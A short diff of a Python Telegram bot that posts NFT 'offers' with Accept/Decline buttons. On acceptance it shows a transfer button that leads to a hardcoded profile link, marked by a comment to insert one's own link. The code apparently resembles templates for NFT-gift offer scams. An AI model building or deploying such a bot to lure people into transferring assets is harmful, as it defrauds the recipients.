@@ -26,7 +26,6 @@ async def create_offer(message: types.Message):
 
     nft_link, price, currency, lang = match.groups()
     
-    # Кнопки для оффера (Принять/Отклонить)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="✅ Принять", callback_data="accept_offer"),
@@ -51,7 +50,6 @@ async def create_offer(message: types.Message):
 # Обработка кнопки "Принять"
 @dp.callback_query(F.data == "accept_offer")
 async def process_accept(callback: CallbackQuery):
-    # ТУТ ВАША ССЫЛКА
     MY_PROFILE_LINK = "https://t.me/tamerlan111" 
 
     transfer_keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -69,6 +67,7 @@ async def process_accept(callback: CallbackQuery):
             reply_markup=transfer_keyboard,
             business_connection_id=callback.message.business_connection_id
         )
+        await callback.message.edit_reply_markup(reply_markup=None)
     except Exception:
         await callback.message.answer(text, reply_markup=transfer_keyboard)
 
